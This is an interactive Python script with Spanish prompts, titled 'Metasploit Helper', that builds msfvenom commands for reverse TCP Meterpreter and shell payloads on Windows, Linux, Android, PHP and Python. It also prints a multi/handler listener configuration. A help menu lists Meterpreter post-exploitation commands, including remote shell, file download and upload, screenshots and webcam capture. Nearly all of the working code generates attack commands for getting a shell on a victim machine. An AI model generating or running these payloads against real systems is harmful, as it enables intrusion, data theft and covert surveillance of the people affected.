#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Metasploit Helper - Asistente de Metasploit
Genera payloads y comandos de Metasploit Framework
"""

import sys
import os

class Colors:
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	END = '\033[0m'
	BOLD = '\033[1m'

BANNER = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣁⣭⣝⢿⡋⠽⢯⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⠻⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⢔⣫⣥⣾⣿⣿⣿⣏⠙⣿⣧⢻⣿⣿⣶⣭⣓⢬⡻⣿⣿⣿⣿⣿⣿⣿⣿⣷⡙⣿⣿⣿⣿⣌⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠃⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢔⣵⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⣿⣧⢻⣿⣿⣿⣿⣷⣄⡈⠻⣿⣿⣿⣿⣿⣿⣿⣷⡘⣿⣿⣿⣿⣆⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⠃⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢢⣿⣿⣿⣿⣿⣿⣿⢛⣿⣿⣿⣿⢹⣿⡘⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣷⡸⣿⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣰⣿⣿⣿⣿⣿⡿⢻⠏⣾⣿⣿⣿⣿⡇⣿⡇⡹⣿⣿⣿⣿⣿⣿⣿⣿⣌⢿⡟⢻⣿⢈⢧⠙⣧⢹⡟⢿⣿⣿⡼⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⣼⡟⢩⣿⣿⢛⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⣿⣿⡟⢡⣿⣸⣿⣿⣿⣿⣿⣷⣿⣇⣳⡿⣿⣿⠻⣿⡉⢻⣿⣿⡎⢿⡴⣝⣋⡌⣎⠸⡏⢿⡌⣿⣿⣧⢹⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⣈⣎⠆⢃⣿⢇⡾⢻⣿⣿⣿⡏⣾⡟⣿⠿⣿⡿⠁⣼⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⡸⣌⣿⣦⢊⠧⢱⡹⣿⣿⡌⣷⣹⣿⡟⠘⡦⢹⡸⣿⡘⣿⣿⡞⣿⣿⣿⣿⣿
⣿⣿⣿⡿⡘⣼⠘⡼⣼⡟⡞⣰⣿⣿⣿⣿⠸⣋⢶⡿⢰⣿⢣⣧⣿⢡⣿⢣⢻⢏⣿⣿⣿⣿⡇⣼⡇⡑⣎⠛⣧⡳⠺⣟⠜⣿⣿⡸⣧⢿⣏⣆⢱⡘⡧⣿⣿⣿⣿⡇⢻⣿⣿⣿⣿
⣿⣿⣿⢡⢱⣇⣸⢣⣿⢰⣿⣿⣸⣿⣿⡏⣆⣿⢸⡇⢸⠏⡞⢸⣿⢸⣿⣼⢰⣾⣏⣿⡟⡿⠇⣿⣿⢰⠹⡨⡜⢷⡁⢬⣧⣸⣿⣇⢻⣼⣿⣿⣷⣿⣧⢸⣿⣿⣿⣿⢸⣿⣿⣿⣿
⣿⣿⡟⣾⣿⣿⡟⣸⣿⢋⣿⣿⣿⣿⣿⢡⡏⡼⢸⡷⣿⠘⢸⢸⣿⣬⣿⣿⢘⣥⢻⡟⠇⣧⢳⣿⣿⠈⣷⠳⣿⣎⢿⣿⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣷⡜⣿⣿⣿⣿⡎⣿⣿⣿⣿
⣿⣿⢡⣿⣿⣿⡇⣿⣿⣼⣿⣿⣿⣿⣿⢸⣿⡇⣿⣷⠇⠀⡌⢸⣿⢻⣿⣿⢸⣿⡼⢡⢸⡟⣸⣿⣿⡎⣌⢷⡹⣿⣦⠻⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⡇⣿⣿⣿⣿
⣿⣿⣾⣿⣿⣿⢷⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⠇⣿⣿⠀⣼⣇⢸⣿⢸⣿⣿⢸⣿⣷⡏⣿⢱⣿⢻⣿⡇⣎⢣⡱⡜⢿⣷⡈⠻⣿⣿⣿⢸⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣷⣿⣿⣿⣿
⣿⣟⣿⣿⣿⣏⣼⣿⣿⣿⣿⣿⣿⣿⡇⣿⡏⠀⣿⣿⠀⣿⣿⢸⣿⡆⣿⣿⣸⣿⡟⡼⢃⣿⣿⢸⣿⢱⣿⣷⡕⢌⠢⡻⣿⣮⡪⡙⢿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣯⣿⣿⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⠉⣴⢹⣿⣸⣿⣿⡏⣿⣷⢿⣿⡏⡿⠑⠁⢸⣿⡿⢸⣿⢸⣿⣿⣿⣷⣕⠌⠪⣿⣿⡌⠳⡆⣿⣿⢻⣿⣿⣿⡙⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⢳⣼⣿⣿⣿⣿⣿⣿⣿⡇⡏⢸⣿⢸⣿⣿⣿⣿⣷⣸⣿⠈⣿⠇⡀⢀⣾⢸⣿⡇⠼⠟⣸⠿⠿⠿⢛⣛⣥⣤⡀⠐⠶⣷⡄⣿⡿⣸⣿⣿⣿⣼⠸⣿⣿⣿⣿⣿⣿⣿
⡏⢸⣿⣿⠀⠰⣾⣿⣿⣿⡇⣿⣿⣿⡇⠃⣾⣿⡆⢍⢛⠻⠿⣿⣧⢻⡌⡁⠞⠁⢿⣿⢸⣿⣧⢸⣆⣐⡤⢞⣛⠻⠿⠍⠉⠙⠁⠈⠀⠀⣚⡃⢿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿
⣸⢸⣿⡇⠀⡗⣼⣿⣿⣿⣧⢹⣿⣿⣇⠀⣿⣿⣿⡘⠸⡿⢷⣶⣶⣦⠲⢲⡐⢷⡈⡻⣼⡿⣸⠘⣸⣿⣞⠉⢀⡀⡀⠀⠀⠀⢰⣾⣿⠂⢉⢀⣿⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⣿⣿
⢧⢸⣿⡇⠃⡇⠟⣿⣿⣿⣿⡞⣿⣿⣿⠀⡿⠇⠉⢁⠀⢀⠀⣀⠀⠀⡀⠀⠈⢎⠳⡄⣿⢡⠇⣰⣿⣿⣧⣾⣿⣇⠑⠮⠔⣁⣾⣿⠛⣠⡾⢸⣿⣿⣿⡏⢣⣿⣿⣿⣿⢿⣿⣿⣿
⣾⣾⣿⡇⠀⡇⠀⣯⡻⣿⣿⣷⡸⣿⣿⡆⣶⣄⠐⢿⣷⣿⡄⠱⣄⡠⠆⣼⣌⣿⡷⡰⠃⠋⣴⣿⣿⣿⣿⣿⣿⣿⣯⣭⣭⣤⣴⣿⢣⣿⢡⢸⣿⣿⣿⡇⣿⣿⣿⣿⣿⣸⣿⣿⣿
⣿⡿⣿⡇⡇⡇⢀⢹⣇⣿⣿⣿⣷⡹⣿⣿⡸⣿⣷⣤⠛⣿⠿⠶⠶⢒⣺⣿⣿⡿⢁⣵⣿⣶⣬⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣾⢃⣸⣼⣿⣿⣿⢠⣿⣿⣿⣿⣿⢿⣿⣿⣿
⣿⠁⣿⡇⠃⡇⢸⠌⡸⡘⣿⣿⣿⣷⡘⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡼⣣⡟⡇⣿⣿⣿⢁⣸⣿⣿⣿⣿⣿⢸⣿⣿⣿
⡛⢰⢻⣧⠀⡇⡸⢀⢣⣷⢻⣿⣿⣿⣿⡌⠻⣷⡽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢈⣴⣿⢃⢸⣿⢏⡇⡆⠋⣿⣿⣿⣿⢻⢸⣿⣿⣿
⣬⠘⡌⣿⢀⡇⡇⢸⡆⡜⣧⢻⣿⣿⣿⣧⢢⣜⢻⣌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣡⣶⣿⣿⡟⢄⣿⡟⡼⡙⣼⢸⣿⣿⣿⣿⢸⢸⣿⣿⣿
⣿⡗⡆⠹⡇⢡⡇⢸⡇⡘⣽⣇⢻⣿⣿⣿⡌⢿⡇⢮⡓⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⡸⠃⣼⣿⣱⠳⢱⣿⢸⣿⣿⣿⣿⢸⡆⣿⣿⣿
⣿⡇⡄⣷⠹⡼⡇⢸⡇⣷⡙⣿⡄⠻⣿⣿⣿⡌⣿⢸⣷⢕⢦⣬⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡅⣼⣿⢡⡇⣰⢸⣿⣸⣿⣿⣿⣿⠈⡇⣿⣿⣿
⣿⢸⠇⣿⢰⠀⠁⣾⠃⣿⢱⡜⢷⡱⡹⣿⣿⣷⡸⢸⣿⢸⣷⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢛⢡⡆⣸⡿⣡⢏⣾⣿⢸⣿⣿⣿⣿⣿⣿⠀⣧⣿⣿⣿
⣿⢸⢰⣿⢸⢸⡆⡙⠀⣿⢸⣗⣌⢧⠱⣜⢿⣿⣷⡘⠟⣼⣿⣿⣿⣿⣷⣮⣝⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣩⣶⣿⠘⣱⠟⢕⣵⣿⣯⢹⣼⣿⢹⢸⣿⣿⣿⠈⢻⢹⣿⣿
⡟⣼⢸⣿⠸⣿⢻⡟⡇⣿⢸⠛⣿⣷⡁⠻⣦⡹⣿⣿⣄⢻⣿⢟⣿⣿⣿⣿⠀⢿⡄⣭⣟⡛⠿⣿⣿⣿⠿⣛⣵⣾⣿⣿⠟⡜⢁⡐⣿⣿⣿⣿⡸⡟⣿⢸⢸⣿⣿⣿⠀⡸⡸⣿⣿
⡇⣿⢸⣿⡇⡏⣼⢡⠇⡿⡾⠀⣿⣿⡿⠆⠈⠵⢎⡻⣿⣦⡁⣾⣿⣿⣿⡏⣼⢸⣧⢻⣿⣿⣿⣶⣶⣶⣾⣿⣿⣿⡿⢋⣨⡆⢿⣇⢻⣿⣿⣿⣇⠃⢻⠘⡈⣿⣿⣿⡇⠃⡇⣿⣿
⡇⣿⢸⣿⡇⢣⡏⣾⢸⡇⢇⡇⡟⡩⢊⠀⣠⣶⢸⣿⣦⠙⠷⣜⢻⣿⠟⣼⣿⢸⠟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣴⣿⢛⣼⢸⣿⡜⣿⣿⣿⣿⠎⠘⡇⡇⣿⣿⣿⡇⡈⢻⢹⣿
⡇⣿⢸⣿⡇⡼⢹⠟⢾⣘⣘⡓⡘⠰⢁⣾⣿⣿⢸⡿⣿⢸⣿⣶⠅⣁⣚⣭⣵⣶⠏⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣿⣿⣇⠻⣧⢹⣿⠏⢱⣿⣆⢧⢧⣿⣿⣿⣇⣧⡜⡎⣿
⣷⢸⠸⡿⢘⣥⣶⣿⣿⣿⣿⡇⠇⢶⣾⢿⣿⣿⣸⡇⣿⢺⢏⡔⣹⣿⣿⣿⣿⣿⣿⣿⣮⡙⢿⣿⣿⣿⣿⣿⣿⠟⣡⣾⣿⣿⣿⣿⣧⣌⠃⢿⣧⢃⢻⣿⣎⢸⢹⣿⣿⣿⢻⠰⢷⢹
⣿⡦⢅⣴⣿⣿⣿⣿⣿⣿⣿⣿⡸⡌⢿⣇⣿⣿⡟⡇⢿⠠⡿⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⣛⣫⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢿⣇⢸⣏⠿⡄⠜⣿⣿⣿⢸⣇⠘⡞
"""

def generate_payload(payload_type, lhost, lport, format_type='raw'):
	"""Genera comandos de payload de Metasploit"""
	payloads = {
		'1': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'2': f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'3': f"msfvenom -p windows/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'4': f"msfvenom -p linux/x86/shell/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'5': f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'6': f"msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
		'7': f"msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f {format_type}",
	}
	return payloads.get(payload_type, "")

def generate_handler(lhost, lport):
	"""Genera comando de handler de Metasploit"""
	return f"""use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit"""

def main():
	print(f"{Colors.BOLD}{Colors.CYAN}{BANNER}{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}╔════════════════════════════════════════╗{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}║    Metasploit Helper - Asistente        ║{Colors.END}")
	print(f"{Colors.BOLD}{Colors.CYAN}╚════════════════════════════════════════╝{Colors.END}\n")
	
	print(f"{Colors.YELLOW}Opciones:{Colors.END}")
	print("1. Generar payload")
	print("2. Generar handler")
	print("3. Comandos útiles de Metasploit")
	
	opcion = input(f"\n{Colors.BLUE}Selecciona opción (1-3): {Colors.END}").strip()
	
	if opcion == '1':
		print(f"\n{Colors.YELLOW}Tipos de payload:{Colors.END}")
		print("1. Windows Meterpreter Reverse TCP")
		print("2. Linux Meterpreter Reverse TCP")
		print("3. Windows Shell Reverse TCP")
		print("4. Linux Shell Reverse TCP")
		print("5. Android Meterpreter Reverse TCP")
		print("6. PHP Meterpreter Reverse TCP")
		print("7. Python Meterpreter Reverse TCP")
		
		payload_type = input(f"\n{Colors.BLUE}Selecciona payload (1-7): {Colors.END}").strip()
		lhost = input(f"{Colors.BLUE}LHOST (tu IP): {Colors.END}").strip()
		lport = input(f"{Colors.BLUE}LPORT (puerto, default: 4444): {Colors.END}").strip() or "4444"
		
		format_type = input(f"{Colors.BLUE}Formato (raw/exe/elf/apk/php/py, default: raw): {Colors.END}").strip() or "raw"
		
		command = generate_payload(payload_type, lhost, lport, format_type)
		if command:
			print(f"\n{Colors.GREEN}[+] Comando generado:{Colors.END}")
			print(f"{Colors.CYAN}{command}{Colors.END}")
		else:
			print(f"{Colors.RED}[!] Payload inválido{Colors.END}")
	
	elif opcion == '2':
		lhost = input(f"{Colors.BLUE}LHOST (tu IP): {Colors.END}").strip()
		lport = input(f"{Colors.BLUE}LPORT (puerto, default: 4444): {Colors.END}").strip() or "4444"
		
		handler = generate_handler(lhost, lport)
		print(f"\n{Colors.GREEN}[+] Handler generado:{Colors.END}")
		print(f"{Colors.CYAN}{handler}{Colors.END}")
	
	elif opcion == '3':
		print(f"\n{Colors.GREEN}[+] Comandos útiles de Metasploit:{Colors.END}\n")
		print(f"{Colors.CYAN}Iniciar Metasploit:{Colors.END}")
		print("  msfconsole")
		print(f"\n{Colors.CYAN}Buscar exploits:{Colors.END}")
		print("  search [término]")
		print(f"\n{Colors.CYAN}Usar un exploit:{Colors.END}")
		print("  use exploit/[ruta]")
		print(f"\n{Colors.CYAN}Ver opciones:{Colors.END}")
		print("  show options")
		print(f"\n{Colors.CYAN}Configurar opciones:{Colors.END}")
		print("  set [OPCIÓN] [VALOR]")
		print(f"\n{Colors.CYAN}Ejecutar exploit:{Colors.END}")
		print("  exploit")
		print(f"\n{Colors.CYAN}Comandos de Meterpreter:{Colors.END}")
		print("  sysinfo          - Información del sistema")
		print("  shell            - Obtener shell")
		print("  download [arch]  - Descargar archivo")
		print("  upload [arch]    - Subir archivo")
		print("  screenshot       - Captura de pantalla")
		print("  webcam_snap      - Foto de webcam")
	
	else:
		print(f"{Colors.RED}[!] Opción inválida{Colors.END}")

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print(f"\n{Colors.YELLOW}[!] Interrumpido por el usuario{Colors.END}")
		sys.exit(0)
	except Exception as e:
		print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
		sys.exit(1)

